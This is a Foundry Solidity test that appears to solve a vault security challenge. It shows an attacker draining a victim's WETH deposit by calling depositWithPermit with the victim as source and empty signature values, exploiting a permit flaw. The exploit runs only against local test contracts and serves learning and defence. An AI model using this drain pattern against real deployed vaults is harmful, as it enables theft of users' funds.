// SPDX-License-Identifier: MIT

pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC20Vault} from "src/Challenges/challenge_2/ERC20Vault.sol";
import {WETH} from "src/Challenges/challenge_2/WETH.sol";

contract ExploitVault is Test {
    WETH weth;
    ERC20Vault vault;
    uint256 public constant DEPOSIT_AMOUNT = 5e18;

    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        weth = new WETH();
        vault = new ERC20Vault(address(weth));
        deal(victim, 10e18);
        deal(address(weth), victim, 10e18);
        deal(attacker, 1e18);
        deal(address(weth), attacker, 1e18);

        //Next fund the vault with funds to steal
        vm.startPrank(victim);
        weth.approve(address(vault), type(uint256).max);
        vault.deposit(DEPOSIT_AMOUNT);
        vm.stopPrank();
    }

    function testStealFundsFromVault() public {
        uint256 startingBalance = weth.balanceOf(attacker);
        vm.startPrank(attacker);

        uint256 amountToSteal = weth.balanceOf(address(vault));
        vault.depositWithPermit(address(victim), address(attacker), amountToSteal, 0, uint8(0), bytes32(0), bytes32(0));
        vault.withdraw(amountToSteal);
        vm.stopPrank();
        assertEq(weth.balanceOf(attacker), DEPOSIT_AMOUNT + startingBalance);
    }
}
